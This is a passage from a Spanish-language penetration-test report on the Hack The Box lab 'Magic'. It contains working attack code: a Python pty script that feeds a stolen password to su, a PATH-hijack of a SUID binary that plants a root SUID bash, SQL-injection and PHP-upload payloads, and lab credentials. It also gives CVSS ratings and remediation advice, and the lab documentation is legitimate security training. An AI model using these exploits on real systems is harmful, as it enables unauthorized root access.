| `Th3s3usW4sK1ng` | tabla `login` (usuario web `admin`) | ✔ probada → **éxito** |

### 9.2 Problema: `su` necesita TTY

`su` de util-linux lee la contraseña **del terminal real** (`/dev/tty`), no de stdin, así
que un simple `echo pass | su ...` no funciona en un canal sin TTY como el que proporciona nuestra webshell.

**Solución:** usar el módulo `pty` de Python en el propio objetivo
(`pty.fork()` + `os.execvp('su', ...)` + escritura de la contraseña en el fd maestro).

Script remoto `suexec.py`:

```python
import pty, os, sys, time
cmd = sys.stdin.read()                      # comando a ejecutar como theseus
pid, fd = pty.fork()
if pid == 0:
    os.execvp('su', ['su', '-', 'theseus', '-c', cmd])
else:
    time.sleep(0.8)
    os.write(fd, b'Th3s3usW4sK1ng\n')       # inyectamos la contraseña
    out = b''
    end = time.time() + 25
    while time.time() < end:
        try:
            d = os.read(fd, 4096)
            if not d: break
            out += d
        except OSError: break
    sys.stdout.write(out.decode(errors='replace'))
```

Se envía al objetivo codificado en base64 y se invoca desde el helper local `th.py`:

```python
def as_theseus(cmd):
    run("test -f /tmp/suexec.py || (echo <b64_suexec> | base64 -d > /tmp/suexec.py)")
    cb = base64.b64encode(cmd.encode()).decode()
    return run(f"echo {cb} | base64 -d | python3 /tmp/suexec.py")
```

El **comando viaja en base64** para no romper comillas/espacios en la cadena que
termina en `sh -c`.

### 9.3 Resultado

```bash
python3 th.py "id; cat /home/theseus/user.txt"
```

```
Password:
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
b5e9a82fe91686986a7384290cad29e4
```

> **FLAG USER:** `b5e9a82fe91686986a7384290cad29e4`

Además, `theseus` pertenece al grupo **`users`** → ahora sí puede ejecutar
`/bin/sysinfo`.

---

## 10. Fase 7 — Escalada a `root`

### 10.1 Análisis del binario SUID

```bash
python3 th.py "ls -la /bin/sysinfo; strings -a /bin/sysinfo"
```

```
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo

# bibliotecas / símbolos
libstdc++.so.6, libc.so.6
setuid
setgid
popen
fgets
pclose

# mensajes y comandos invocados
"popen() failed!"
"====================Hardware Info===================="
lshw -short
"====================Disk Info===================="
fdisk -l
"====================CPU Info===================="
cat /proc/cpuinfo
"====================MEM Usage====================="
free -h
```

**Análisis:**

1. Es un binario **C++** compilado con GCC 7.4 (Ubuntu 18.04).
2. Importa `setuid`/`setgid` y `popen`/`pclose`.
3. Ejecuta 4 comandos para volcar información del sistema: `lshw -short`, `fdisk -l`,
   `cat /proc/cpuinfo`, `free -h`.
4. **Los comandos NO llevan ruta absoluta** → se resuelven con el `PATH` del proceso.
5. Como el binario tiene SUID y no baja explícitamente los privilegios antes de los
   `popen()`, **los hijos heredan `euid=0`**.

### 10.2 Exploit: PATH hijacking

Idea: crear un directorio con un binario falso llamado como el **primer** comando
(`lshw`), colocarlo **primero en el `PATH`** y ejecutar `sysinfo`; `popen("lshw -short")`
ejecutará nuestro script **como root**.

```bash
mkdir -p /tmp/p
cat > /tmp/p/lshw <<'EOF'
#!/bin/sh
id > /tmp/pwned
chmod 777 /tmp/pwned
cp /bin/bash /tmp/.rb
chmod 4755 /tmp/.rb
EOF
chmod +x /tmp/p/lshw

PATH=/tmp/p:$PATH /bin/sysinfo > /tmp/si.out 2>&1
```

> El `PATH` debe incluir los directorios del sistema al final para que el resto de
> comandos (`free`, `fdisk`, `cat`) sigan resolviéndose correctamente y `sysinfo` termine
> sin errores.

**Resultado:**

```
--- marker ---
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
-rwsr-xr-x 1 root root 1113504 ... /tmp/.rb

=== /tmp/si.out ===
====================Hardware Info====================
                       (vacío: nuestro lshw no imprime nada)
====================Disk Info====================
Disk /dev/loop0: 160.2 MiB, ... (fdisk real ejecutado correctamente)
```

- `uid=0(root)` → **el script se ejecutó como root**.
- `/tmp/.rb` es una copia de `/bin/bash` con **bit SUID** → shell de root persistente.

### 10.3 Lectura de las flags

```bash
python3 th.py "/tmp/.rb -p -c 'id; cat /home/theseus/user.txt; cat /root/root.txt'"
```

```
uid=1000(theseus) gid=1000(theseus) euid=0(root) groups=1000(theseus),100(users)
=== USER ===
b5e9a82fe91686986a7384290cad29e4
=== ROOT ===
b02c7d5efa0aacb2fc84b0182948dea7
```

> `-p` preserva el euid=0 en bash (necesario porque el uid real sigue siendo `theseus`).

---

## 11. Flags obtenidas

| Flag | Ubicación | Valor |
|---|---|---|
| **User** | `/home/theseus/user.txt` | `b5e9a82fe91686986a7384290cad29e4` |
| **Root** | `/root/root.txt` | `b02c7d5efa0aacb2fc84b0182948dea7` |

---

## 12. Diagrama de la cadena de ataque

```
┌──────────────────────────────────────────────────────────────────────────┐
│ FASE 1-2 · RECONOCIMIENTO                                               │
│ nmap -p- → 22/SSH 80/HTTP → ffuf + gobuster → login.php / upload.php    │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FASE 3 · SQLi SIN AUTENTICAR (login.php)                                │
│ admin' OR 1=1-- -            → 302 upload.php (bypass de login)         │
│ UNION + FROM DUAL + oráculo  → Magic.login = admin:Th3s3usW4sK1ng       │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FASE 4 · UPLOAD → RCE                                                   │
│ whitelist de extensión (solo última) + getimagesize()                   │
│ .htaccess FilesMatch ".+\.php" SIN anclar  ⇒  shell.php.png ejecutable  │
│ PNG polímorfico + passthru($_GET["c"])    ⇒  RCE www-data               │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FASE 5-6 · POST-EXPLOTACIÓN                                             │
│ db.php5 → theseus/iamkingtheseus (no sirve)                             │
│ su theseus con Th3s3usW4sK1ng (reutilización)  ⇒  FLAG user.txt         │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FASE 7 · ESCALADA A ROOT                                                │
│ /bin/sysinfo SUID root, grupo users → popen("lshw -short")              │
│ PATH hijack con binario falso → euid=0 → SUID bash → FLAG root.txt      │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## 13. Análisis de vulnerabilidades y CVSS

| # | Vulnerabilidad | CVSS v3.1 | Ubicación | Evidencia |
|---|---|---|---|---|
| 1 | **SQL Injection** (UNION, sin prepared statements) | 9.8 (CRÍTICA) | `login.php:12` `$pdo->query("...'$username'...")` | Bypass de login + extracción completa de la tabla |
| 2 | **Contraseñas en texto plano** en BD | 7.5 (ALTA) | tabla `Magic.login` | `admin:Th3s3usW4sK1ng` extraída tal cual |
| 3 | **Upload → RCE** por `.htaccess` con `FilesMatch` sin anclar + validación de contenido insuficiente | 8.8 (ALTA) | `/var/www/Magic/.htaccess`, `upload.php` | `rce.php.png` ejecuta PHP |
| 4 | **Binario SUID con PATH no saneado** (`popen` de comandos relativos) | 7.8 (ALTA) | `/bin/sysinfo` | `PATH=/tmp/p:$PATH /bin/sysinfo` → root |
| 5 | **Reutilización de credenciales** web ↔ sistema | 7.5 (ALTA) | usuario `theseus` | `Th3s3usW4sK1ng` sirve en web y en `su` |
| 6 | **Exposición de código/config** en el document root (`db.php5`, `.htaccess` legibles) | 5.3 (MEDIA) | `/var/www/Magic/` | Lectura directa por www-data |
| 7 | Filtro *blacklist* de `sleep`/`benchmark` (no mitiga nada, solo time-based) | 3.7 (BAJA) | `login.php:7` | El boolean-based no se ve afectado |
| 8 | Software desactualizado (Apache 2.4.29, OpenSSH 7.6p1, polkit 0.105 sin PwnKit parcheado) | 5.9 (MEDIA) | servicios | `pkexec version 0.105` (CVE-2021-4034 no explotada) |

---

## 14. Intentos fallidos y lecciones aprendidas

Registrar lo que **no** funcionó es tan importante como el éxito:

| Intento | Por qué falló | Lección |
|---|---|---|
| Subir `.php`, `.phtml`, `.php5`, `.phar` | Whitelist estricta de extensión | Atacar la *interpretación* (handler), no la extensión |
| Cambiar el `Content-Type` del multipart | El servidor usa `pathinfo()`, no el MIME | El MIME del cliente es controlable e irrelevante |
| `x.png.php` (acabar en `.php`) | Regex anclada al final | Invertir el orden: `.php` **dentro** del nombre |
| Null byte `shell.php\0.png` | PHP ≥ 5.3.4 rechaza `\0` en rutas | Técnica obsoleta |
| Time-based SQLi (`SLEEP`/`BENCHMARK`) | Blacklist explícita en `login.php` | Usar boolean-based en su lugar |
| `SELECT 1,2,3 WHERE ...` sin `FROM` | MySQL exige tabla (o `DUAL`) | El oráculo devolvía siempre falso |
| SSH con `admin:Th3s3usW4sK1ng` / usuarios enumerados | `PasswordAuthentication` off (solo `publickey`) | Las creds web no implican acceso SSH |
| `su theseus` con `iamkingtheseus` (la de `db.php5`) | Es la contraseña MySQL, no la del sistema | Probar **todas** las credenciales halladas |
| `sudo -S -l` con credenciales ajenas | sudo pide la contraseña del usuario actual (`www-data`) | sudo no permite "entrar" como otro usuario |
| Ejecutar comandos largos en una única petición HTTP | Apache cerraba la conexión (`RemoteDisconnected`) | Dividir, reintentar y usar helper con reintentos |
| Reutilizar el archivo `*.php.png` tras ejecutarlo | El archivo desaparece (404) tras la ejecución | Regenerar payload en cada llamada |
| `pkill -f "nc -lvnp 4444"` | `-f` matchea la cmdline propia → se mató la shell | Usar patrones auto-excluyentes `[n]c ...` |

---

## 15. Recomendaciones de remediación

### Inmediatas (1-2 días)

1. **SQLi — `login.php`**: migrar a *prepared statements* con placeholders:
   ```php
   $stmt = $pdo->prepare("SELECT * FROM login WHERE username = ? AND password = ?");
   $stmt->execute([$username, $password]);
   ```
   Eliminar el filtro por blacklist (`sleep`/`benchmark`): no aporta seguridad.
2. **`.htaccess`**: eliminar el bloque `<FilesMatch ".+\.ph(...)">` global. Si se necesita
   fijar el handler, usar el patrón **anclado** del paquete oficial:
   ```apache
   <FilesMatch "\.ph(ar|p|tml)$">
       SetHandler application/x-httpd-php
   </FilesMatch>
   ```
3. **Upload**: renombrar los archivos con nombre aleatorio
   (`bin2hex(random_bytes(16)) . '.png'`), validar con `finfo_file()`/`exif_imagetype()`
   **y** comprobar que la extensión real coincide con el tipo detectado; no confiar en
   `$_FILES['image']['name']`.
4. **`db.php5`**: moverlo fuera del document root (p. ej. `/var/www/inc/`) con permisos
   `640 root:www-data`.

### Corto plazo (1 semana)

5. **`/bin/sysinfo`**: quitar el bit SUID (`chmod u-s`) o recompilar usando rutas
   absolutas (`/usr/bin/lshw`, `/bin/fdisk`, `/usr/bin/free`, `/bin/cat`) y un `PATH`
   fijo establecido con `setenv()`; idealmente usar `execve()` con `envp` vacío.
6. **Credenciales**: hash de contraseñas con `password_hash()` (bcrypt/argon2), política
   de no reutilización, rotación de la contraseña de BD y de `theseus`.
7. **ssh**: mantener `PasswordAuthentication no` de forma global (no solo en `Match User`).

### Duradero

8. Servir las subidas desde un dominio/directorio estático sin ejecución de scripts
   (o con `noexec` en la partición), con `Content-Disposition: attachment`.
9. Actualizar Apache/OpenSSH/polkit (PwnKit CVE-2021-4034 está presente pero no explotada).
10. Aplicar principio de mínimo privilegio: el usuario web no debería tener escritura en
    todo el document root; separar `images/uploads` como volumen dedicado.
11. Activar logging de errores de PHP a archivo y alertas ante patrones de inyección;
    añadir WAF (ModSecurity) con reglas CRS.

---

## 16. Artefactos y limpieza

### 16.1 Artefactos generados (operador)

Directorio: `/home/kali/htb/magic/`

| Archivo | Descripción |
|---|---|
| `nmap_full.nmap` / `.gnmap` / `.xml` | Escaneo completo de puertos |
| `ffuf_common.json` | Resultados de fuzzing con `common.txt` |
| `gob_medium.txt` | Resultados de gobuster (`directory-list-2.3-medium`) |
| `sqli_extract.py` | Extractor booleano UNION (búsqueda binaria) |
| `mkpoly.py` | Generador de PNG polímorfico con payload PHP |
| `poly2.png`, `test.png`, `s1.php`, `shell.php` | Payloads de prueba |
| `rce.py` | Helper de RCE vía upload (sube + ejecuta + parsea) |
| `suexec.py` | Ejecutor de comandos vía `su` con pty (remoto) |
| `th.py` | Helper local que orquesta `suexec.py` |
| `cookies.txt` | Sesión autenticada en `login.php` |
| `upload.html`, `up_resp.html`, `try.sh`, `su_test.py` | Soporte de pruebas |
| `informe_magic.md` | **Este informe** |

### 16.2 Limpieza ejecutada en el objetivo

```bash
# como root (vía /tmp/.rb -p)
rm -f /tmp/.rb /tmp/pwned /tmp/si.out /tmp/suexec.py
rm -rf /tmp/p
cd /var/www/Magic/images/uploads
# se conservan SOLO los archivos originales de la máquina
ls | grep -vE "^(7.jpg|giphy.gif|logo.png|magic-hat_23-2147512156.jpg|magic-1424x900.jpg|magic-wand.jpg|trx.jpg)$" \
   | xargs -r rm -f
```

Estado final de `/var/www/Magic/images/uploads/`:

```
7.jpg, giphy.gif, logo.png, magic-1424x900.jpg,
magic-hat_23-2147512156.jpg, magic-wand.jpg, trx.jpg
```

- ✅ Webshells (`p*.php.png`, `rce.php.png`, `rce2.php.png`) eliminadas.
- ✅ SUID bash (`/tmp/.rb`), marcadores y scripts temporales eliminados.
- ✅ Listener `nc` del operador finalizado.
- ✅ `/bin/sysinfo` **no** fue modificado.
- ✅ No se dejó persistencia alguna.

---

*Fin del informe.*
